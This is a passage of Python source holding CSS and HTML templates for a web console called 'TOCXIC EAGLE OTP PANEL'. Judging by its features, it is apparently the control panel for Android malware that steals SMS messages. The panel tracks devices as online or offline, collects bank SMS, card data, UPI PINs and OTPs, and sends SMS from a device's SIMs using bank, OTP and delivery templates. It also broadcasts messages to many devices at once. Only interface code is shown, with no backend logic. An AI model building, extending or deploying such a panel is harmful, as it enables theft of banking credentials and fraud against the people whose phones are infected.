.badge-amber{background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.25);color:var(--amber)}
.badge-red{background:rgba(228,0,0,.15);border:1px solid rgba(228,0,0,.25);color:var(--red2)}
.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.dot-green{background:var(--green);box-shadow:0 0 6px var(--green)}
.dot-red{background:var(--border2)}

.drawer-overlay{position:fixed;inset:0;z-index:50;background:rgba(0,0,0,.7);
backdrop-filter:blur(6px);display:none}
.drawer-overlay.open{display:flex;justify-content:flex-end}
.drawer{width:100%;max-width:440px;height:100%;background:var(--bg2);
border-left:1px solid var(--border);display:flex;flex-direction:column;animation:slideIn .2s ease-out}
@keyframes slideIn{from{transform:translateX(24px);opacity:.7}to{transform:translateX(0);opacity:1}}
.drawer-header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
.drawer-icon{width:38px;height:38px;border-radius:11px;background:var(--grad);
display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff;font-size:20px}
.drawer-title{font-size:14px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.drawer-id{font-size:9px;font-family:'JetBrains Mono',monospace;color:var(--text3);margin-top:2px}
.drawer-status{padding:8px 16px;border-bottom:1px solid var(--border);background:var(--bg3);
display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.drawer-body{flex:1;overflow-y:auto;padding:14px}

.tabs{display:flex;border-bottom:1px solid var(--border);overflow-x:auto;background:var(--bg2)}
.tab{padding:11px 14px;font-size:11px;font-weight:700;color:var(--text3);
border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s;cursor:pointer}
.tab.active{color:var(--red2);border-bottom-color:var(--red)}
.tab.active-g{color:var(--green);border-bottom-color:var(--green)}
.tab.active-p{color:var(--purple);border-bottom-color:var(--purple)}
.tab.active-b{color:var(--blue2);border-bottom-color:var(--blue2)}
.tab.active-mail{color:var(--amber);border-bottom-color:var(--amber)}
.tab .tab-emoji{font-size:13px;margin-right:4px}

.kv{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid var(--border)}
.kv:last-child{border-bottom:none}
.kv-k{font-size:11px;color:var(--text3);width:120px;flex-shrink:0}
.kv-v{font-size:12px;font-weight:600;text-align:right;word-break:break-all}
.kv-v.mono{font-family:'JetBrains Mono',monospace;font-size:11px}

.bank-card{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.15);
border-left:2px solid var(--green);border-radius:var(--radius);padding:12px;margin-bottom:8px}
.cc-card{background:rgba(168,85,247,.05);border:1px solid rgba(168,85,247,.15);
border-left:2px solid var(--purple);border-radius:var(--radius);padding:12px;margin-bottom:8px}
.bal-big{font-size:22px;font-weight:900;font-family:'Orbitron',sans-serif}
.sms-item{background:var(--bg3);border:1px solid var(--border);border-left:2px solid var(--border2);
border-radius:var(--radius);padding:10px;margin-bottom:6px;position:relative}
.sms-item.is-bank{border-left-color:rgba(34,197,94,.6)}
.sms-item.is-card{border-left-color:rgba(168,85,247,.6)}
.sms-item.mail-item{border-left-color:rgba(245,158,11,.8);
  background:linear-gradient(90deg,rgba(245,158,11,.06),var(--bg3) 40%)}
.sms-item.fresh{background:linear-gradient(90deg,rgba(34,197,94,.08),var(--bg3) 45%)}
.sms-sender{font-size:11px;font-weight:700}
.sms-time{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace}
.sms-body{font-size:11px;color:var(--text2);line-height:1.55;margin-top:5px;word-break:break-word}
.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;
font-weight:800;padding:3px 7px;border-radius:6px;font-family:'Orbitron',sans-serif}
.sms-item .msg-type-badge.otp{background:#0f3cc9;color:#fff}
.sms-item .msg-type-badge.number{background:#12b76a;color:#fff}
.sms-item .msg-type-badge.mail{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff}
.otp-highlight{background:linear-gradient(135deg,#d1fae5,#a7f3d0);color:#065f46;
padding:3px 8px;border-radius:6px;font-weight:800;border:1px dashed #12b76a;
font-family:'Orbitron',sans-serif;letter-spacing:1px}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:12px;
padding:9px 16px;background:linear-gradient(135deg,#12b76a,#32d583);color:#fff;
border:none;border-radius:20px;font-weight:800;font-size:12px;font-family:inherit;
min-height:40px;cursor:pointer}

.inp{width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border2);
border-radius:var(--radius);font-size:13px;color:var(--text)}
.inp:focus{border-color:var(--red)}
textarea.inp{resize:vertical;min-height:90px;font-family:inherit}
.section-label{font-size:10px;font-weight:700;letter-spacing:.08em;color:var(--text3);
text-transform:uppercase;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}

.empty{text-align:center;padding:48px 20px;color:var(--text3)}
.empty-icon{font-size:36px;margin-bottom:12px;display:block}

.status-emoji{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;
  font-size:11px;font-weight:800;letter-spacing:.4px;font-family:'Orbitron',sans-serif}
.status-emoji.online{background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);color:var(--green);
  animation:onlinePulse 2s infinite}
.status-emoji.offline{background:rgba(228,0,0,.1);border:1px solid rgba(228,0,0,.28);color:var(--red2)}
@keyframes onlinePulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.35)}
  50%{box-shadow:0 0 0 6px rgba(34,197,94,0)}}
.status-emoji .emoji{font-size:13px;line-height:1}

.mail-tab-bar{display:flex;gap:8px;margin-bottom:14px}
.mail-tab-btn{flex:1;padding:12px;border-radius:12px;font-size:12px;font-weight:800;
background:var(--bg3);border:1.5px solid var(--border2);color:var(--text3);
font-family:'Orbitron',sans-serif;letter-spacing:.5px;cursor:pointer;min-height:46px}
.mail-tab-btn.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border-color:transparent;
box-shadow:0 4px 12px rgba(245,158,11,.3)}

.bc-fab{position:fixed;bottom:24px;right:94px;z-index:45;
  width:60px;height:60px;border-radius:50%;
  background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;
  display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;
  box-shadow:0 10px 30px rgba(245,158,11,.45),0 4px 12px rgba(249,115,22,.35);
  transition:.2s;cursor:pointer}
.bc-fab:hover{transform:scale(1.06) rotate(6deg);filter:brightness(1.1)}
.bc-fab .count-badge{position:absolute;top:-4px;right:-4px;min-width:20px;height:20px;padding:0 5px;
  background:var(--red);color:#fff;border-radius:10px;font-size:10px;font-weight:900;
  display:flex;align-items:center;justify-content:center;border:2px solid var(--bg);
  font-family:'Orbitron',sans-serif}

.compose-fab{position:fixed;bottom:24px;right:24px;z-index:45;
  width:60px;height:60px;border-radius:50%;
  background:linear-gradient(135deg,#0F3CC9,#3B82F6);color:#fff;border:none;
  display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:900;
  box-shadow:0 10px 30px rgba(59,130,246,.45),0 4px 12px rgba(15,60,201,.35);
  transition:.2s;cursor:pointer}
.compose-fab:hover{transform:scale(1.06) rotate(-6deg);filter:brightness(1.1)}

.bc-modal,.send-modal{position:fixed;inset:0;z-index:80;background:rgba(0,0,0,.75);
backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;padding:16px}
.bc-modal.open,.send-modal.open{display:flex}
.bc-box{width:100%;max-width:640px;max-height:92vh;overflow-y:auto;
  background:var(--bg2);border:1px solid rgba(245,158,11,.35);border-radius:18px;
  box-shadow:0 30px 80px rgba(245,158,11,.25);animation:popIn .2s ease-out}
.send-box{width:100%;max-width:540px;max-height:92vh;overflow-y:auto;
  background:var(--bg2);border:1px solid rgba(59,130,246,.35);border-radius:18px;
  box-shadow:0 30px 80px rgba(59,130,246,.25);animation:popIn .2s ease-out}
@keyframes popIn{from{transform:scale(.94);opacity:.6}to{transform:scale(1);opacity:1}}
.bc-head,.send-box-head{padding:16px 18px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:10px}
.bc-head{background:linear-gradient(135deg,rgba(245,158,11,.12),rgba(228,0,0,.06))}
.send-box-head{background:linear-gradient(135deg,rgba(15,60,201,.12),rgba(59,130,246,.08))}
.bc-head .bc-icon{width:38px;height:38px;border-radius:11px;
  background:linear-gradient(135deg,#f59e0b,#f97316);
  display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;flex-shrink:0}
.send-box-head .sb-icon{width:38px;height:38px;border-radius:11px;
  background:linear-gradient(135deg,#0F3CC9,#3B82F6);
  display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}
.bc-head .bc-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;color:var(--amber)}
.send-box-head .sb-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;color:var(--blue2)}
.bc-head .bc-sub,.send-box-head .sb-sub{font-size:10px;color:var(--text3);margin-top:2px;font-family:'JetBrains Mono',monospace}
.bc-body,.send-box-body{padding:18px}
.bc-target-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.bc-ts{padding:12px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;text-align:center}
.bc-ts .n{font-size:20px;font-weight:900;font-family:'Orbitron',sans-serif;line-height:1}
.bc-ts .l{font-size:9px;color:var(--text3);text-transform:uppercase;font-weight:700;
  letter-spacing:.5px;margin-top:5px;font-family:'Orbitron',sans-serif}
.bc-ts.online{border-color:rgba(34,197,94,.3)}.bc-ts.online .n{color:var(--green)}
.bc-ts.offline{border-color:rgba(228,0,0,.3)}.bc-ts.offline .n{color:var(--red2)}
.bc-ts.total .n{color:var(--blue2)}
.bc-modes{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
.bc-mode{padding:8px 14px;border-radius:20px;font-size:11px;font-weight:800;
  background:var(--bg3);border:1px solid var(--border2);color:var(--text3);
  cursor:pointer;transition:.15s;font-family:'Orbitron',sans-serif;letter-spacing:.5px}
.bc-mode:hover{border-color:var(--amber);color:var(--amber)}
.bc-mode.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;
  border-color:transparent;box-shadow:0 4px 12px rgba(245,158,11,.3)}
.bc-dev-list{max-height:260px;overflow-y:auto;border:1px solid var(--border);
  border-radius:12px;background:var(--bg3);padding:6px;margin-bottom:14px}
.bc-dev-row{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:9px;
  cursor:pointer;transition:.12s}
.bc-dev-row:hover{background:rgba(255,255,255,.03)}
.bc-dev-row.selected{background:rgba(245,158,11,.1)}
.bc-check{width:20px;height:20px;border-radius:6px;border:2px solid var(--border2);
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
  color:#fff;font-size:12px;font-weight:900;transition:.15s}
.bc-check.checked{background:linear-gradient(135deg,#f59e0b,#f97316);border-color:transparent}
.bc-dev-info{flex:1;min-width:0}
.bc-dev-title{font-size:12px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bc-dev-sub{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:2px}
.bc-dev-status{font-size:11px;flex-shrink:0}
.bc-templates,.template-row{display:flex;gap:6px;margin-bottom:10px;overflow-x:auto;padding-bottom:2px}
.bc-chip,.template-chip{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
  background:var(--bg3);border:1px solid var(--border2);color:var(--text3);
  white-space:nowrap;transition:.15s;cursor:pointer}
.bc-chip:hover{border-color:var(--amber);color:var(--amber)}
.template-chip:hover{border-color:var(--blue2);color:var(--blue2)}
.bc-counter,.char-counter{display:flex;justify-content:space-between;align-items:center;
  font-size:10px;color:var(--text3);margin-top:6px;font-family:'JetBrains Mono',monospace}
.bc-counter.warn,.char-counter.warn{color:var(--amber)}
.bc-counter.over,.char-counter.over{color:var(--red2)}
.bc-progress{margin-top:12px;padding:10px 12px;border-radius:10px;
  background:var(--bg3);border:1px solid var(--border2);display:none}
.bc-progress.show{display:block}
.bc-progress-bar{height:4px;background:var(--border);border-radius:2px;overflow:hidden;margin-bottom:8px}
.bc-progress-fill{height:100%;background:linear-gradient(135deg,#f59e0b,#f97316);border-radius:2px;
  transition:width .3s ease-out;width:0%}
.bc-progress-text{font-size:11px;color:var(--text2);font-weight:600;
  font-family:'JetBrains Mono',monospace;text-align:center}
.bc-actions{display:flex;gap:8px;margin-top:16px}
.bc-actions .btn{flex:1;padding:13px}
.btn-bc{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;
  box-shadow:0 4px 14px rgba(245,158,11,.35);border:none;
  display:inline-flex;align-items:center;justify-content:center;gap:6px;
  padding:13px;border-radius:10px;font-size:13px;font-weight:800;
  transition:.15s;cursor:pointer;font-family:inherit}
.btn-bc:hover{filter:brightness(1.08)}
.btn-bc:disabled{opacity:.5;cursor:not-allowed}
.btn-send{background:linear-gradient(135deg,#0F3CC9,#3B82F6);color:#fff;
  box-shadow:0 4px 14px rgba(59,130,246,.35);border:none;
  display:inline-flex;align-items:center;justify-content:center;gap:6px;
  padding:13px;border-radius:10px;font-size:13px;font-weight:800;
  transition:.15s;cursor:pointer;font-family:inherit}
.btn-send:hover{filter:brightness(1.08)}
.btn-send:disabled{opacity:.5;cursor:not-allowed}

.sim-picker{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px}
.sim-opt{padding:12px;border-radius:12px;background:var(--bg3);border:2px solid var(--border);
  cursor:pointer;transition:.15s}
.sim-opt:hover{border-color:var(--border2)}
.sim-opt.active{border-color:var(--blue2);background:rgba(15,60,201,.08);
  box-shadow:0 0 0 3px rgba(59,130,246,.12)}
.sim-opt .sim-label{font-size:11px;font-weight:800;color:var(--text2);letter-spacing:.5px;
  font-family:'Orbitron',sans-serif}
.sim-opt.active .sim-label{color:var(--blue2)}
.sim-opt .sim-num{font-size:10px;color:var(--text3);margin-top:3px;
  font-family:'JetBrains Mono',monospace}
.recipient-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
.recipient-tag{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;
  background:rgba(15,60,201,.15);border:1px solid rgba(59,130,246,.3);
  border-radius:20px;font-size:11px;font-weight:700;color:var(--blue2);
  font-family:'JetBrains Mono',monospace}
.recipient-tag .rm{width:14px;height:14px;border-radius:50%;background:rgba(228,0,0,.3);
  color:#fff;display:flex;align-items:center;justify-content:center;
  font-size:9px;font-weight:900;cursor:pointer}
.recipient-tag .rm:hover{background:var(--red)}

.loading-text{text-align:center;padding:26px;color:var(--text3);font-size:13px;
background:var(--bg2);border-radius:18px;margin-bottom:16px;border:1px solid var(--border)}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.15);
border-top-color:var(--red);border-radius:50%;animation:spin .8s linear infinite;
vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.progress-bar{width:100%;height:4px;background:rgba(255,255,255,.08);border-radius:2px;
overflow:hidden;margin-top:12px}
.progress-fill{height:100%;background:var(--grad);border-radius:2px;transition:width .3s}
.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(34,197,94,.15);
color:#4ade80;font-size:10px;font-weight:800;padding:3px 9px;border-radius:20px;
margin-left:8px;font-family:'Orbitron',sans-serif}
.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#12b76a;
animation:pulse 1.2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}

.mail-header-card{
  background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(228,0,0,.06));
  border:1px solid rgba(245,158,11,.25);border-radius:12px;padding:14px;margin-bottom:14px}
.mail-header-card .mh-title{font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;
  letter-spacing:1px;color:var(--amber);margin-bottom:6px;display:flex;align-items:center;gap:6px}
.mail-header-card .mh-desc{font-size:11px;color:var(--text3);line-height:1.5;margin-bottom:10px}
.mail-header-card .mh-stats{display:flex;gap:8px;flex-wrap:wrap}
.mail-stat-pill{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;
  border-radius:20px;font-size:10px;font-weight:800;font-family:'Orbitron',sans-serif;letter-spacing:.4px}
.mail-stat-pill.total{background:rgba(245,158,11,.15);color:var(--amber);border:1px solid rgba(245,158,11,.3)}
.mail-stat-pill.devices{background:rgba(59,130,246,.15);color:var(--blue2);border:1px solid rgba(59,130,246,.3)}
.mail-stat-pill.delivered{background:rgba(34,197,94,.15);color:var(--green);border:1px solid rgba(34,197,94,.3)}

#toast{position:fixed;bottom:96px;left:50%;transform:translateX(-50%) translateY(140px);
z-index:120;background:var(--bg4);border:1px solid var(--border2);border-radius:24px;
padding:10px 22px;font-size:12px;font-weight:700;transition:transform .3s;pointer-events:none;
max-width:90vw;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.5)}
#toast.show{transform:translateX(-50%) translateY(0)}

.hidden{display:none !important}
@media(max-width:600px){
  .grid-main{grid-template-columns:1fr}
  .drawer{max-width:100%}
  .stats-bar{padding:0 8px}.stat-item{padding:8px 12px}
  .topbar{padding:8px 12px}
  .bc-fab{bottom:20px;right:80px;width:52px;height:52px;font-size:22px}
  .compose-fab{bottom:20px;right:20px;width:52px;height:52px;font-size:22px}
}
"""

# ═══════════════════════════════════════════════════════════════
# LANDING
# ═══════════════════════════════════════════════════════════════
LANDING_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#E40000">
""" + ORBITRON + """
<style>""" + DARK_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(ellipse 80% 60% at 70% 0%,#2a0a0a 0%,transparent 60%),
radial-gradient(ellipse 70% 50% at 30% 100%,#0a1240 0%,transparent 65%),var(--bg);
padding:30px 20px;text-align:center}
.wrap{max-width:560px;width:100%}
.eagle{font-size:96px;margin-bottom:14px;animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
h1{font-family:'Orbitron',sans-serif;font-weight:900;font-size:36px;letter-spacing:3px;
margin-bottom:10px;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.subtitle{font-family:'Orbitron',sans-serif;font-weight:600;font-size:11px;color:var(--text3);
letter-spacing:4px;margin-bottom:36px;text-transform:uppercase}
.tagline{font-size:15px;color:var(--text2);line-height:1.7;margin-bottom:40px}
.cta-grid{display:grid;grid-template-columns:1fr;gap:14px;max-width:400px;margin:0 auto 40px}
@media(min-width:520px){.cta-grid{grid-template-columns:1fr 1fr}}
.cta{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
padding:28px 20px;border-radius:22px;text-decoration:none;color:#fff;font-weight:800;
transition:.25s;min-height:140px;border:1px solid var(--border2);background:var(--bg2)}
.cta.user{border-color:rgba(228,0,0,.4);box-shadow:0 0 30px rgba(228,0,0,.15) inset}
.cta.otp{border-color:rgba(15,60,201,.4);box-shadow:0 0 30px rgba(15,60,201,.15) inset}
.cta:active{transform:scale(.97)}
.cta .icon{font-size:42px}
.cta .label{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:1.5px;text-transform:uppercase}
.cta .desc{font-size:11px;color:var(--text3);font-weight:600}
.features{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;max-width:520px;margin:0 auto}
.feat{background:var(--bg2);border:1px solid var(--border2);border-radius:16px;padding:16px 10px;text-align:center}
.feat .fi{font-size:24px;margin-bottom:6px}
.feat .fl{font-size:10px;font-weight:800;color:var(--text2);font-family:'Orbitron',sans-serif;
letter-spacing:.8px;text-transform:uppercase}
.footer{margin-top:44px;font-size:10px;color:var(--text3);font-family:'Orbitron',sans-serif;
letter-spacing:3px;text-transform:uppercase}
</style></head><body>
<div class="wrap">
<div class="eagle">🦅</div>
<h1>TOCXIC EAGLE</h1>
<div class="subtitle">OTP PANEL</div>
<p class="tagline">Real-time SMS &amp; OTP monitoring panel.<br>Lightning fast · Secure · Always live.</p>
<div class="cta-grid">
<a href="/user" class="cta user">
<span class="icon">📱</span>
<span class="label">Open Panel</span>
<span class="desc">No login required</span>
</a>
<a href="/otp" class="cta otp">
<span class="icon">🔐</span>
<span class="label">Personal OTP</span>
<span class="desc">Add your firebase</span>
</a>
</div>
<div class="features">
<div class="feat"><div class="fi">⚡</div><div class="fl">Realtime</div></div>
<div class="feat"><div class="fi">🛡️</div><div class="fl">Secure</div></div>
<div class="feat"><div class="fi">🔄</div><div class="fl">Auto 10m</div></div>
</div>
<div class="footer">TOCXIC EAGLE · v72</div>
</div>
</body></html>"""

# ═══════════════════════════════════════════════════════════════
# ADMIN LOGIN
# ═══════════════════════════════════════════════════════════════
ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + DARK_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(ellipse at top,#2a0a0a 0%,#08090b 60%),var(--bg);padding:20px}
.box{width:100%;max-width:400px;background:var(--bg2);border:1px solid var(--border2);
border-radius:22px;padding:34px 26px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.lock{text-align:center;font-size:52px;margin-bottom:14px}
h1{text-align:center;font-family:'Orbitron',sans-serif;font-size:20px;margin-bottom:6px;
background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;
letter-spacing:2px;font-weight:900}
p.sub{text-align:center;font-size:12px;color:var(--text3);margin-bottom:24px;
font-family:'Orbitron',sans-serif;letter-spacing:2px;text-transform:uppercase}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;
border:1.5px solid var(--border2);background:var(--bg3);color:var(--text);outline:none;transition:.2s}
input:focus{border-color:var(--amber);box-shadow:0 0 0 4px rgba(245,158,11,.15)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
cursor:pointer;font-size:20px;color:var(--text3);padding:4px}
button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;
background:var(--grad);color:#fff;font-weight:800;font-size:14px;
font-family:'Orbitron',sans-serif;letter-spacing:1px;cursor:pointer;min-height:54px;text-transform:uppercase}
button:active{transform:scale(.98)}
.err{margin-top:14px;text-align:center;color:var(--red2);font-size:13px;font-weight:700}
.back-link{display:block;text-align:center;margin-top:16px;color:var(--text3);
text-decoration:none;font-size:12px}
</style></head><body>
<form class="box" method="POST"><div class="lock">👑</div>
<h1>SUPER MASTER</h1><p class="sub">Admin access</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
</div>
<button type="submit">Admin Login</button>__ERROR__
<a href="/" class="back-link">← Back to landing</a>
</form>
<script>
function togglePwd(e){var i=document.getElementById('pwd');var t=e.target;
if(i.type==='password'){i.type='text';t.textContent='🙈';}
else{i.type='password';t.textContent='👁️';}}
</script>
</body></html>"""

# ═══════════════════════════════════════════════════════════════
# MAIN PANEL TEMPLATE
# ═══════════════════════════════════════════════════════════════
PANEL_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Panel</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#E40000">
""" + ORBITRON + """
<style>""" + DARK_CSS + """</style></head><body>

<div id="main-page" style="display:flex">
  <div class="topbar">
    <div class="topbar-logo">
      <span class="eagle">🦅</span>
      <span class="name">TOCXIC EAGLE</span>
    </div>
    <div class="search-wrap">
      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
      <input class="search-inp" id="search-inp" placeholder="Search devices…" oninput="renderGrid()">
    </div>
    <div class="topbar-right">
      <div class="badge badge-green"><div class="dot dot-green" id="conn-dot"></div><span id="conn-txt">Live</span></div>
      <div class="clock" id="clock"></div>
      <button class="btn btn-ghost btn-sm" onclick="refreshAll()">↻</button>
    </div>
  </div>

  <div class="nav-links">{NAV_LINKS}</div>

  <div class="stats-bar">
    <div class="stat-item"><div class="stat-n" id="stat-total">0</div><div class="stat-l">Total</div></div>
    <div class="stat-item"><div class="stat-n" style="color:var(--green)" id="stat-online">0</div><div class="stat-l">📡 Online</div></div>
    <div class="stat-item"><div class="stat-n" style="color:var(--red2)" id="stat-offline">0</div><div class="stat-l">⚠️ Offline</div></div>
    <div class="stat-item"><div class="stat-n" style="color:var(--green)" id="stat-bank">0</div><div class="stat-l">Bank SMS</div></div>
    <div class="stat-item"><div class="stat-n" style="color:var(--purple)" id="stat-card">0</div><div class="stat-l">Cards</div></div>
    <div class="stat-item" style="border:none"><div class="stat-n" style="color:var(--blue2)" id="stat-mail">0</div><div class="stat-l">📧 Mail</div></div>
  </div>

  <div class="filter-bar">
    <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
    <button class="filter-btn" onclick="setFilter('online',this)">📡 Online</button>
    <button class="filter-btn" onclick="setFilter('offline',this)">⚠️ Offline</button>
    <button class="filter-btn" onclick="setFilter('bank',this)">Bank SMS</button>
    <button class="filter-btn" onclick="setFilter('card',this)">Cards</button>
    <button class="filter-btn" onclick="setFilter('upi',this)">UPI PIN</button>
    <select class="sort-select" onchange="setSort(this.value)">
      <option value="new">Newest</option>
      <option value="old">Oldest</option>
      <option value="name">Name A–Z</option>
      <option value="battery">Battery</option>
    </select>
  </div>

  <div class="grid-main" id="device-grid">
    <div class="empty"><span class="empty-icon">📡</span>Connecting…</div>
  </div>
</div>

{SHOW_BC_FAB}

<!-- ✉️ SEND SMS MODAL -->
<div class="send-modal" id="send-modal" onclick="if(event.target===this)closeSendModal()">
  <div class="send-box">
    <div class="send-box-head">
      <div class="sb-icon">✉️</div>
      <div class="flex1 min0">
        <div class="sb-title">SEND SMS</div>
        <div class="sb-sub" id="send-subtitle">no device selected</div>
      </div>
      <button class="btn-icon" onclick="closeSendModal()">✕</button>
    </div>
    <div class="send-box-body">
      <div class="section-label">SIM Slot</div>
      <div class="sim-picker">
        <div class="sim-opt active" id="sim-opt-1" onclick="pickSim(1)">
          <div class="sim-label">📶 SIM 1</div>
          <div class="sim-num" id="sim1-num">— — —</div>
        </div>
        <div class="sim-opt" id="sim-opt-2" onclick="pickSim(2)">
          <div class="sim-label">📶 SIM 2</div>
          <div class="sim-num" id="sim2-num">— — —</div>
        </div>
      </div>

      <div class="section-label" style="margin-top:12px">
        <span>Recipients</span>
        <span style="font-weight:600;color:var(--text3);font-size:9px;letter-spacing:0">comma or newline separated</span>
      </div>
      <input class="inp" id="send-to" placeholder="+919876543210, +919988776655"
             oninput="updateRecipients()" style="font-family:'JetBrains Mono',monospace;font-size:13px">
      <div class="recipient-tags" id="recipient-tags"></div>

      <div class="section-label" style="margin-top:16px">Message</div>
      <div class="template-row">
        <div class="template-chip" onclick="applyTemplate('otp')">🔐 OTP</div>
        <div class="template-chip" onclick="applyTemplate('bank')">🏦 Bank</div>
        <div class="template-chip" onclick="applyTemplate('alert')">⚠️ Alert</div>
        <div class="template-chip" onclick="applyTemplate('delivery')">📦 Delivery</div>
        <div class="template-chip" onclick="applyTemplate('blank')">🗑 Clear</div>
      </div>
      <textarea class="inp" id="send-body" placeholder="Type your message…"
                oninput="updateCounter()" rows="4" style="min-height:100px"></textarea>
      <div class="char-counter" id="char-counter">
        <span id="char-segments">1 SMS · GSM-7</span>
        <span id="char-count">0 / 160</span>
      </div>

      <div class="bc-progress" id="send-progress">
        <div class="bc-progress-bar"><div class="bc-progress-fill" id="send-progress-fill"></div></div>
        <div class="bc-progress-text" id="send-progress-text">Sending…</div>
      </div>

      <div class="bc-actions">
        <button class="btn btn-ghost" onclick="closeSendModal()">Cancel</button>
        <button class="btn-send" id="send-btn" onclick="doSend()">✉️ Send SMS</button>
      </div>
    </div>
  </div>
</div>

<!-- 📧 BROADCAST MODAL -->
<div class="bc-modal" id="broadcast-modal" onclick="if(event.target===this)closeBroadcastModal()">
  <div class="bc-box">
    <div class="bc-head">
      <div class="bc-icon">📧</div>
      <div class="flex1 min0">
        <div class="bc-title">BROADCAST MAIL</div>
        <div class="bc-sub" id="bc-subtitle">send to multiple devices</div>
      </div>
      <button class="btn-icon" onclick="closeBroadcastModal()">✕</button>
    </div>
    <div class="bc-body">
      <div class="bc-target-stats">
        <div class="bc-ts total"><div class="n" id="bc-total">0</div><div class="l">Total</div></div>
        <div class="bc-ts online"><div class="n" id="bc-online">0</div><div class="l">📡 Online</div></div>
        <div class="bc-ts offline"><div class="n" id="bc-offline">0</div><div class="l">⚠️ Offline</div></div>
      </div>
      <div class="section-label">Target Mode</div>
      <div class="bc-modes">
        <div class="bc-mode active" id="tm-all" onclick="pickTargetMode('all')">ALL</div>
        <div class="bc-mode" id="tm-online" onclick="pickTargetMode('online')">📡 ONLINE</div>
        <div class="bc-mode" id="tm-offline" onclick="pickTargetMode('offline')">⚠️ OFFLINE</div>
        <div class="bc-mode" id="tm-manual" onclick="pickTargetMode('manual')">✋ MANUAL</div>
      </div>
      <div class="section-label">
        <span>Devices <span id="bc-selected-count" style="color:var(--amber)">(0 selected)</span></span>
        <span id="bc-msg-info" style="font-size:9px;color:var(--text3);letter-spacing:0;font-weight:600">1 mail per device</span>
      </div>
      <div class="bc-dev-list" id="bc-device-list"></div>
      <div class="section-label">Mail Body</div>
      <div class="bc-templates">
